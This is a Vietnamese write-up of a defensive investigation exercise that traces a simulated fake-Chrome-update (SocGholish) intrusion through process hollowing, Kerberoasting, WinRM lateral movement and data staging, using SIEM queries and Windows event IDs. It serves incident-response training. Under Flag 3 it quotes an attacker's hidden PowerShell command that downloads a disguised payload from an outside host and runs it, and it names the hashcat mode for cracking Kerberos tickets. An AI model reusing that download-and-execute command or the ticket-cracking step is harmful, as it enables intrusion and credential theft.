---
title: "Operation Cymbal — Deceptive Click"
date: 2026-11-01
description: Truy vết một ca FAKEUPDATES/SocGholish từ alert ban đầu tới Kerberoasting, lateral movement và staging trước khi exfil, trên Google SecOps.
tags: [writeup, soc, dfir, kerberoasting]
---

## Tổng quan

Nhân viên `marcus.vance` ở văn phòng Denver bấm vào một bản "cập nhật Chrome" giả trên một blog bị chèn mã độc (FAKEUPDATES / SocGholish). Từ máy này, attacker leo thang lên SYSTEM, Kerberoast hai service account, rồi đánh cắp dữ liệu từ DB server và file server.

Đề bài: scenario "Deceptive Click" (Investigation, very easy, 675 điểm) trong sự kiện Operation Cymbal: Cold Room. Công cụ: Google SecOps (SOAR Case, SIEM Search, Google Threat Intelligence).

| # | Câu hỏi | Đáp án | Nguồn log chính |
| --- | --- | --- | --- |
| 1 | Hostname máy Denver bị nhiễm | `CYM-DEN-W10-042.cymbal.corp` | SOAR Case |
| 2 | Blog bị compromise (referer) | `marketingtrends-insider.com` | Web proxy, `network.http.referral_url` |
| 3 | PID của svchost.exe bị hollow | `624` | Sysmon trên máy Denver |
| 4 | SPN bị Kerberoast | `MSSQLSvc/CYM-DB-01.cymbal.corp:1433` | Security 4769 trên CYM-DC-01 |
| 5 | Account dùng để lateral movement | `svc_dbadmin` | Security 4624 trên CYM-DB-01 |
| 6 | File zip staging trên file server | `Financial_Audit_2026.zip` | Sysmon 11 trên CYM-FS-01 |

### Kill chain

```
[Blog bị hack · Flag 2]        [Máy Denver · Flag 1, 3]            [CYM-DC-01 · Flag 4]
marketingtrends-insider.com --> CYM-DEN-W10-042, marcus.vance  --> Kerberoasting (4769)
ChromeSetup_v124.zip            ChromeSetup.js -> d27e15eb.exe     MSSQLSvc/CYM-DB-01.cymbal.corp:1433
(FAKEUPDATES / SocGholish)      Hollow svchost PID 624                     |
                                net, nltest: trinh sát domain              | TGS ticket
                                                                           v
                                                               [Crack offline]
                                                               svc_dbadmin (SID ...1089)
                                                               svc_backup  (SID ...1088)
                                           svc_dbadmin                |            | svc_backup
                          +-------------------------------------------+            v
                          v                                              [CYM-FS-01 · Flag 6]
[CYM-DB-01 · Flag 5]                                                     svc_backup chạy powershell.exe
svc_dbadmin từ CYM-DATA-WS-007 qua WinRM                                 C:\Windows\Temp\Financial_Audit_2026.zip
sqlcmd backup -> cymbal_cust_q3.bak                                      Staging trước khi exfil (T1074)
zstd -> cymbal_q3_exfil.tar.zst
Exfil -> 142.11.200.188:8888
```

Log không cho thấy attacker đi từ máy Denver sang CYM-DATA-WS-007 bằng cách nào. Sơ đồ chỉ vẽ những bước có event làm bằng chứng.

Mẹo nộp flag: nhập đúng giá trị theo format, không bọc `HTB{...}`.

## Flag 1 — Hostname máy Denver

**Đáp án:** `CYM-DEN-W10-042.cymbal.corp`

**Cách làm**

1. Vào SOAR, mở hàng đợi Cases. Nếu trống thì mở rộng bộ lọc thời gian (case nằm ở ngày 15/10/2026).
2. Mở case "PowerShell Download And Execute" và đọc phần Entities / Alerts: hostname, IP nội bộ, user (`marcus.vance`).
3. Chuyển sang SIEM Search, kiểm tra lại bằng: `principal.hostname = "CYM-DEN-W10-042.cymbal.corp"`.

**Giải thích:** tên máy theo quy ước `CYM-<site>-<OS>-<số>`: `DEN` là Denver, `W10` là Windows 10. Đọc được quy ước đặt tên giúp phân biệt máy trạm (`W10`, `WS`), server (`DB`, `FS`) và DC (`DC`) ở các câu sau.

**Bài học:** luôn bắt đầu từ alert/case để lấy 3 pivot ban đầu: **host, user, thời điểm**. Mọi query sau đều xuất phát từ 3 giá trị này.

**Thực tế:** analyst L1 triage case, xác nhận asset và chủ sở hữu, rồi cô lập máy (network containment qua EDR) trước khi điều tra sâu, để attacker không tiếp tục lan sang máy khác.

## Flag 2 — Blog bị compromise (referer)

**Đáp án:** `marketingtrends-insider.com`

**Cách làm**

1. Đọc GTI Malware Profile của FAKEUPDATES: nạn nhân vào một trang hợp pháp bị chèn JavaScript, trang hiện thông báo "trình duyệt cần cập nhật" và cho tải một file zip chứa `.js`.
2. Lọc log proxy/HTTP của máy Denver quanh thời điểm tải: `principal.hostname = "CYM-DEN-W10-042.cymbal.corp" AND network.http.method = "GET"`, hoặc tìm thẳng tên file `ChromeSetup`.
3. Mở event tải `ChromeSetup_v124.zip`, xem trường `network.http.referral_url` = `https://marketingtrends-insider.com/`. Lấy phần domain.

**Giải thích:** `target.url` cho biết file được tải từ **đâu**. Referer cho biết người dùng **đang ở trang nào** khi bấm tải. Với SocGholish, trang đó là blog hợp pháp bị hack, còn file được phục vụ từ hạ tầng riêng của attacker. Đề hỏi đúng cái blog.

**Bài học:** đọc threat intel trước khi search. Profile đã nói rõ chuỗi lây nhiễm (blog bị hack → fake update → file `.js`), nên bạn biết cần tìm trường nào.

**Thực tế:** chặn domain/URL trên proxy, search toàn công ty xem còn ai truy cập blog đó. Biện pháp phòng ngừa phổ biến: đổi chương trình mặc định mở `.js`/`.jse` từ Windows Script Host sang Notepad bằng GPO, vì hầu như không người dùng nào cần chạy file JScript.

## Flag 3 — PID của svchost.exe bị process hollowing

**Đáp án:** `624` (svchost.exe `-k netsvcs -p`, chạy dưới quyền SYSTEM)

**Chuỗi process trên máy Denver**

1. `explorer.exe` → `wscript.exe` chạy `ChromeSetup.js` (nạn nhân double-click file trong zip).
2. `wscript.exe` → `powershell.exe -w Hidden -c "iwr ... https://static.cdn-updater-distribution.net/assets/d27e15eb.png -OutFile C:\Users\marcus.vance\AppData\Local\Temp\d27e15eb.exe; Start-Process ..."`. Payload ngụy trang thành `.png` rồi đổi thành `.exe` khi lưu.
3. `d27e15eb.exe` hollow vào svchost.exe **PID 624** để có quyền SYSTEM.
4. Sau đó là trinh sát domain: `net.exe group "Domain Admins" /domain`, `nltest.exe`.

**Cách làm đúng:** tìm event mà **source** là `d27e15eb.exe` và **target** là `svchost.exe`. Sysmon Event 8 (CreateRemoteThread) hoặc Event 10 (ProcessAccess) ghi sẵn cặp `SourceImage` / `TargetImage` và `TargetProcessId`. Query gợi ý:

```
principal.hostname = "CYM-DEN-W10-042.cymbal.corp" AND target.process.file.full_path = /svchost\.exe/ nocase AND principal.process.file.full_path = /d27e15eb/ nocase
```

Nếu UDM không ra, dùng Raw Log Search với từ khóa `d27e15eb`.

**Vì sao 4192, 6124, 8120 sai:** đó là PID của các process **khác** trong chuỗi: 4192 là process cha của wscript, 6124 là PowerShell tải payload, 8120 là `net.exe`. Đề hỏi **Target** Process ID của svchost, tức phía bị tiêm, không phải phía tiêm hay process con.

**Bài học:** với injection, luôn phân biệt rõ source (kẻ tiêm), target (nạn nhân) và parent/child. Đừng lấy số PID đầu tiên nhìn thấy.

**Thực tế:** process hollowing (MITRE T1055.012) khiến mã độc chạy dưới danh nghĩa một process tin cậy. EDR phát hiện bằng cách so image trên đĩa với image trong bộ nhớ, hoặc cảnh báo khi một file trong `AppData\Local\Temp` mở handle ghi vào process SYSTEM. Máy bị hollow coi như mất kiểm soát hoàn toàn và cần reimage.

## Flag 4 — SPN bị Kerberoast

**Đáp án:** `MSSQLSvc/CYM-DB-01.cymbal.corp:1433`

**Cách làm**

1. Kerberoasting tạo ra Security Event **4769** (A Kerberos service ticket was requested) trên Domain Controller.
2. Query: `metadata.product_event_type = "4769" AND target.hostname = /CYM-DC-01/ nocase`. Nếu bị lỗi enum hay không ra kết quả, hãy bỏ bớt điều kiện và chỉ giữ `metadata.product_event_type = "4769"`.
3. Mở event, đọc trường `target.application` (ServiceName / SPN). Giá trị đầy đủ gồm cả port `:1433`.

**Giải thích:** bất kỳ user domain nào cũng được xin ticket TGS cho một SPN. Ticket đó được mã hóa bằng hash mật khẩu của service account sở hữu SPN. Attacker lấy ticket về và crack offline (hashcat mode 13100). `MSSQLSvc/...:1433` là SPN của SQL Server trên CYM-DB-01, chạy bằng `svc_dbadmin`.

**Lỗi thường gặp:** gõ `metadata.event_type = "..."` với giá trị không nằm trong enum sẽ báo `invalid value for enum field`. Mã Windows event phải dùng `metadata.product_event_type`. Ngoài ra, không được bỏ `:1433` khi nộp flag.

**Bài học:** học thuộc vài event ID xác thực quan trọng: 4624 (logon), 4625 (logon fail), 4768 (TGT), 4769 (TGS), 4672 (đăng nhập có quyền admin).

**Thực tế:** dấu hiệu Kerberoast là 4769 với `TicketEncryptionType = 0x17` (RC4), hoặc một user xin nhiều SPN trong thời gian ngắn. Phòng ngừa: dùng gMSA (mật khẩu 120 ký tự, tự xoay vòng), tắt RC4, đặt mật khẩu service account dài trên 25 ký tự, và cài honey SPN để bắt attacker.

## Flag 5 — Account dùng để lateral movement

**Đáp án:** `svc_dbadmin`

**Cách làm**

1. Tìm logon mạng (4624) của các service account sau thời điểm Kerberoast: `metadata.product_event_type = "4624" AND target.user.userid = /^svc_/`.
2. Kết quả: `svc_dbadmin` đăng nhập vào **CYM-DB-01** từ **CYM-DATA-WS-007** (10.240.12.65), LogonType 3, NTLM, lúc 20:47:11 UTC.
3. 15 giây sau, Sysmon trên CYM-DB-01 ghi `wsmprovhost.exe` chạy dưới `svc_dbadmin`. Đây là phiên PowerShell Remoting (WinRM, T1021.006).

**Attacker làm gì trên CYM-DB-01** (đều chạy dưới svc_dbadmin, phần lớn xuất phát từ `wsmprovhost.exe`, PID 3820):

| Giờ UTC | Hành động |
| --- | --- |
| 21:49:46 | `powershell.exe` kết nối ra `142.11.200.188:8888`: exfiltration |
| 21:19:56 | Tạo `C:\ProgramData\README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT`: thư tống tiền |
| 21:13:26 | `zstd.exe` nén file backup thành `cymbal_q3_exfil.tar.zst` |
| 20:49:56 | `sqlcmd` backup database `CymbalWealthMaster` ra `cymbal_cust_q3.bak` |
| 20:47:26 | `wsmprovhost.exe` khởi động (WinRM) |
| 20:47:11 | Logon 4624 của `svc_dbadmin` từ CYM-DATA-WS-007 |

**Giải thích:** SPN ở Flag 4 thuộc SQL Server, nên account bị crack là account chạy SQL, tức `svc_dbadmin`. Một service account đăng nhập tương tác qua WinRM từ một máy trạm là bất thường: service account chỉ nên chạy dịch vụ, không dùng để đăng nhập.

**Bài học:** nối các event bằng **LogonId / LogonGuid** (`0x6E1F4`) và **ParentProcessId** (3820) để chứng minh mọi hành động thuộc cùng một phiên của attacker.

**Thực tế:** reset mật khẩu service account ngay (hoặc chuyển sang gMSA), giới hạn quyền logon ("Deny log on through Remote Desktop / network" cho service account), và chỉ cho WinRM nhận kết nối từ jump host quản trị.

## Flag 6 — File zip staging trên file server

**Đáp án:** `Financial_Audit_2026.zip`

**Event quyết định:** Sysmon Event 11 (FileCreate), RuleName `T1074 Data Staged`

| Trường | Giá trị |
| --- | --- |
| Computer | `CYM-FS-01.cymbal.corp` |
| User | `CYMBAL\svc_backup` (SID ...-1088) |
| Image | `powershell.exe` (PID 4920) |
| TargetFilename | `C:\Windows\Temp\Financial_Audit_2026.zip` |
| Thời điểm | 2026-10-15 21:25:56 UTC |

**Cách làm**

1. Bỏ bộ lọc theo user và tìm theo **hành vi**: `target.file.full_path = /\.zip$/ nocase`.
2. Hoặc tìm theo lệnh nén: `target.process.command_line = /Compress-Archive|\.zip/ nocase`.
3. Hoặc dùng Raw Log Search với từ khóa `.zip` / `Audit`.

**Vì sao bị kẹt lâu ở câu này**

- Query ban đầu lọc `svc_dbadmin`, nhưng trên file server attacker dùng **`svc_backup`**. SID chỉ lệch nhau 1 số (1088 và 1089), rất có thể cả hai đều bị Kerberoast.
- Gemini gọi `CYM-DATA-WS-007` là file server. Thực ra `WS` là workstation, là máy attacker dùng làm bàn đạp. File server là `CYM-FS-01`.
- Các đáp án đã nộp sai (`cymbal_q3_exfil.tar.zst`, `cymbal_cust_q3.bak`) đều nằm trên DB server và không phải file zip. Chỉ cần so với đề (file server + `.zip`) là loại được ngay.

**Bài học:** khi hunt, lọc theo hành vi trước (loại file, lệnh, technique), rồi mới lần ngược ra user và host. Lọc theo account quá sớm sẽ bỏ sót khi attacker đổi danh tính.

**Thực tế:** staging (T1074) thường diễn ra ngay trước exfiltration, nên phát hiện ở bước này vẫn kịp chặn dữ liệu ra ngoài. Rule gợi ý: file archive lớn được tạo trong `C:\Windows\Temp` hoặc `C:\ProgramData` bởi service account. Sau đó kiểm tra kết nối ra ngoài từ CYM-FS-01 (giống `142.11.200.188:8888` trên DB-01) để biết file zip đã bị đưa ra hay chưa.

## Bài học tổng hợp

**Sai lầm đã gặp và cách tránh**

1. **Tin AI đoán mò.** Gemini khẳng định "chính xác 100%" với PID 8120 và với các tên file của DB-01, nhưng đều sai. Mỗi đáp án phải chỉ ra được **một event cụ thể** và **một trường cụ thể** chứa nó.
2. **Không đối chiếu với đề.** Đề nói "file server" và "zip", nhưng đã nộp file `.tar.zst` và `.bak` trên DB server. Trước khi nộp, kiểm tra đáp án khớp với mọi từ khóa trong câu hỏi: host, loại file, format.
3. **Nhầm vai trò của PID.** Source, target, parent và child là bốn khái niệm khác nhau. Đọc kỹ đề hỏi cái nào.
4. **Lọc theo user quá sớm.** Attacker có thể có nhiều account. Hãy hunt theo hành vi trước.
5. **Đoán tên trường UDM.** Các lỗi `field "text" does not exist`, `invalid value for enum` xảy ra do đoán tên trường. Mở một event mẫu trong Event Viewer để xem tên trường thật, hoặc dùng Raw Log Search.

**Quy trình chung cho bài Investigation trên SecOps**

1. Case/alert → lấy host, user, thời điểm.
2. Đọc threat intel (GTI profile) → biết chuỗi tấn công dự kiến.
3. Đi theo kill chain: initial access → execution → privilege escalation → discovery → credential access → lateral movement → collection → exfiltration.
4. Mở rộng khung thời gian và đổi pivot (host ↔ user ↔ IP ↔ hash) khi bị kẹt.
5. Nối event bằng LogonId, ProcessGuid, ParentProcessId.

**Cheat sheet UDM query**

| Mục đích | Query |
| --- | --- |
| Tất cả event của một host | `principal.hostname = "CYM-DEN-W10-042.cymbal.corp"` |
| Process launch trên host | `principal.hostname = "..." AND metadata.event_type = "PROCESS_LAUNCH"` |
| Theo mã Windows event | `metadata.product_event_type = "4769"` |
| Logon của service account | `metadata.product_event_type = "4624" AND target.user.userid = /^svc_/` |
| File theo đuôi | `target.file.full_path = /\.zip$/ nocase` |
| Command line chứa từ khóa | `target.process.command_line = /Compress-Archive/ nocase` |
| Referer HTTP | `network.http.referral_url != ""` |
| Theo user (hai phía) | `principal.user.userid = "svc_dbadmin" OR target.user.userid = "svc_dbadmin"` |

Dùng regex `/.../ nocase` khi không chắc chữ hoa/thường hay tên đầy đủ. Không ra kết quả gì thì chuyển sang Raw Log Search.
